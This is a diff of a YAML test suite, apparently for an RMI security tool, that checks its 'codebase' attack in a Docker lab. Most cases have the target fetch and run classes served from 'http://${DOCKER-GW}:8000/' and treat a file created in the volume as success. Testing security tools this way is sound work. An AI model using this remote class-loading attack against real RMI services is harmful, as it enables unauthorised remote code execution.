@@ -1,66 +1,187 @@
 tester:
-  name: codebase
   title: Codebase Tests
-  description: "Performs tests on remote-methods-guessers 'codebase' action."
+  description: |-
+    'Performs tests for the codebase action.'
+
+  id: '001-004'
+  groups:
+    - codebase
+  id_pattern: '001-004-{:03}'
+
+
+plugins:
+  - os_command:
+      cmd:
+        - javac
+        - -source
+        - 1.8
+        - -target
+        - 1.8
+        - '../../utils/${codebase-class}1.java'
+        - '../../utils/${codebase-class}2.java'
+        - '../../utils/${codebase-class}3.java'
+        - '../../utils/${codebase-class}4.java'
+
+  - http_listener:
+      port: 8000
+      dir: ../../utils
+
 
 tests:
-  - title: Registry Codebase Call
-    description: >
-      'Performs a codebase attack on the registry endpoint.'
-      'This should fail, as the useCodebaseOnly is set to true.'
+  - title: Activator Codebase Call
+    description: |-
+      'Performs a codebase attack on the activator endpoint.'
+      'The expected result is a file being created within the docker'
+      'volume.'
 
     command: '${BASE-CMD}'
     arguments:
       - codebase
-      - TestClass
+      - '${codebase-class}1'
       - 'http://${DOCKER-GW}:8000/'
-      - --signature
+      - --component
+      - act
+    validators:
+      - error: False
+      - regex:
+          match:
+            - 'Codebase attack.+successful'
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${codebase-class}1.txt'
+
+
+  - title: Registry Codebase Call
+    description: |-
+      'Performs a codebase attack on the registry endpoint.'
+      'The expected result is a file being created within the docker'
+      'volume.'
+
+    command: '${BASE-CMD}'
+    arguments:
+      - codebase
+      - '${codebase-class}2'
+      - 'http://${DOCKER-GW}:8000/'
+      - --component
       - reg
     validators:
       - error: False
-      - contains:
-          values:
-            - is disabled
-            - not possible
+      - regex:
+          match:
+            - 'Codebase attack.+worked'
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${codebase-class}2.txt'
 
 
   - title: DGC Codebase Call
-    description: >
+    description: |-
       'Performs a codebase attack on the DGC endpoint.'
-      'This should fail, as the useCodebaseOnly is set to true.'
+      'The expected result is an AccessControlException'
 
     command: '${BASE-CMD}'
     arguments:
       - codebase
-      - TestClass
+      - '${codebase-class}'
       - 'http://${DOCKER-GW}:8000/'
-      - --signature
+      - --component
       - dgc
     validators:
       - error: False
       - contains:
           values:
-            - is disabled
-            - not possible
+            - 'AccessControlException'
+            - 'SecurityManager'
 
 
   - title: Method Codebase Call
-    description: >
-      'Performs a codebase attack on a method.'
-      'This should fail, as the useCodebaseOnly is set to true.'
+    description: |-
+      'Performs a codebase attack on the plain-server remote object.'
+      'The expected result is a file being created within the docker'
+      'volume.'
 
-    command: '${BASE-CMD}'
+    command: '${BASE-CMD-SSL}'
     arguments:
       - codebase
-      - TestClass
+      - '${codebase-class}3'
       - 'http://${DOCKER-GW}:8000/'
-      - --signature 
-      - 'javax.management.remote.rmi.RMIConnection newClient(java.lang.Object arg)'
+      - --signature
+      - 'String system(String dummy, String[] dummy2)'
       - --bound-name
-      - jmxrmi
+      - plain-server
     validators:
       - error: False
       - contains:
           values:
-            - is disabled
-            - not possible
+            - 'load dummy class'
+            - 'attack probably worked'
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${codebase-class}3.txt'
+
+
+  - title: Method Codebase Call (Legacy)
+    description: |-
+      'Performs a codebase attack on the legacy-service remote object.'
+      'The expected result is a file being created within the docker'
+      'volume.'
+
+    command: '${BASE-CMD}'
+    arguments:
+      - codebase
+      - '${codebase-class}4'
+      - 'http://${DOCKER-GW}:8000/'
+      - --signature
+      - 'String login(java.util.HashMap dummy1)'
+      - --bound-name
+      - legacy-service
+    validators:
+      - error: False
+      - contains:
+          values:
+            - 'load dummy class'
+            - 'attack probably worked'
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${codebase-class}4.txt'
+
+
+  - title: Missing Signature
+    description: |-
+      'Performs a codebase attack with missing --signature option and checks'
+      'the corresponding error message.'
+
+    command: '${BASE-CMD}'
+    arguments:
+      - codebase
+      - '${codebase-class}4'
+      - 'http://${DOCKER-GW}:8000/'
+    validators:
+      - error: True
+      - contains:
+          values:
+            - 'The --bound-name, --objid or --component option is required'
+            - 'Cannot continue from here.'
+
+
+  - title: No Class Load
+    description: |-
+      'Performs a codebase attack with a wrong specified listener port.'
+
+    command: '${BASE-CMD}'
+    arguments:
+      - codebase
+      - 'Test'
+      - 'http://127.0.0.1:8002/'
+      - --component
+      - act
+    validators:
+      - error: False
+      - contains:
+          values:
+            - 'Caught ClassNotFoundException'
+            - 'not be loaded'
